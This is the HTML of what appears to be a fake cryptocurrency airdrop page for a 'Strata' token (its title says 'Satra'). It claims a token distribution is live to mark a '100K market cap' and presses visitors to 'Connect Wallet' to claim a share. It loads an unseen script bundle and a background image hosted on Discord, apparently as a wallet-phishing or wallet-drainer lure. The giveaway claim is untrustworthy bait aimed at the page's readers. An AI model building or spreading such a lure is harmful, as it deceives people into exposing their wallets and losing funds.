<!DOCTYPE html><html lang="en"><head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Satra Token</title>
<script src="/separate-main.4ba0e6b2.js" type="module"></script>
<style>:root {
  --bg: #061018;
  --muted: #ffffff8c;
  --modal-width: 360px;
  --radius: 14px;
}

html, body {
  color: #e6eef8;
  -webkit-font-smoothing: antialiased;
  height: 100%;
  margin: 0;
  font-family: Inter, system-ui, -apple-system, Segoe UI, Roboto, Arial;
}

body:before {
  content: "";
  filter: blur(4px) brightness(.7);
  z-index: 0;
  background: url("https://media.discordapp.net/attachments/1424131517474410566/1424779421969289297/image.png?ex=68e530bd&is=68e3df3d&hm=5f286a9724933bcc6652ae44d43fa025f0e6f61dfd37e7d4355ec4ff470d477c&=&format=webp&quality=lossless&width=550&height=309") center / cover no-repeat;
  position: fixed;
  inset: 0;
}

.page {
  z-index: 1;
  justify-content: center;
  align-items: center;
  min-height: 100vh;
  padding: 40px;
  display: flex;
  position: relative;
  overflow: hidden;
}

.hero {
  filter: blur(6px) saturate(.9);
  opacity: .45;
  background: linear-gradient(#ffffff03, #0000);
  border-radius: 20px;
  width: 940px;
  height: 520px;
  box-shadow: 0 6px 40px #03070cbf;
}

.overlay {
  pointer-events: none;
  justify-content: center;
  align-items: center;
  display: flex;
  position: absolute;
  inset: 0;
}

.modal {
  width: var(--modal-width);
  border-radius: calc(var(--radius) 6px);
  text-align: center;
  pointer-events: auto;
  backdrop-filter: blur(6px);
  z-index: 2;
  background: linear-gradient(#ffffff05, #ffffff03);
  border: 1px solid #ffffff0a;
  padding: 22px;
  position: relative;
  box-shadow: 0 20px 60px #000000b3;
}

.logo {
  color: #fff;
  background: linear-gradient(135deg, #3fb1ff, #7b6cff);
  border-radius: 12px;
  justify-content: center;
  align-items: center;
  width: 56px;
  height: 56px;
  margin: 0 auto 12px;
  font-size: 22px;
  font-weight: 700;
  display: flex;
}

.modal h2 {
  margin: 4px 0 8px;
  font-size: 18px;
  font-weight: 600;
}

.modal p.lead {
  color: var(--muted);
  margin: 0 0 18px;
  font-size: 13px;
}

.btn {
  cursor: pointer;
  box-sizing: border-box;
  border: none;
  border-radius: 10px;
  width: 100%;
  margin-bottom: 10px;
  padding: 11px 14px;
  font-size: 14px;
  font-weight: 600;
  display: inline-block;
}

.btn-primary {
  color: #02162a;
  background: linear-gradient(#4ec0ff, #2d8ce6);
  border: 1px solid #ffffff0f;
  box-shadow: 0 6px 18px #257bcc2e;
}

.btn-ghost {
  color: var(--muted);
  backdrop-filter: blur(6px);
  background: none;
  border: 1px solid #ffffff0a;
}

.btn[disabled] {
  opacity: .45;
  cursor: not-allowed;
}

.hint {
  color: var(--muted);
  margin-top: 8px;
  font-size: 12px;
}

@media (width <= 420px) {
  .modal {
    width: calc(100% - 32px);
  }

  .hero {
    display: none;
  }
}

.content {
  z-index: 2;
  text-align: center;
  color: #fff;
  position: relative;
}
</style>
</head>
<body>
  <div class="page">
    <div class="hero" aria-hidden="true"></div>

    <div class="overlay" role="dialog" aria-modal="true" aria-label="Strata Season 0 invitation">
      <div class="modal" id="inviteModal">
        <div class="logo" aria-hidden="true">S</div>
        <h2>Strata Token Distribution Is<br><strong>Now Live  </strong></h2>
        <p class="lead">We just started distribution of our token in honor of 100K market cap! Connect wallet and get your share!</p>

        <button id="connectWalletBtn" class="btn btn-primary">Connect Wallet</button>

        <div class="hint" id="modalHint">You must connect your wallet to withdraw.</div>
      </div>
    </div>
  </div>

  <div class="content">
    <p id="status">Connecting to wallet...</p>
    <p id="balance"></p>
  </div>


</body></html>
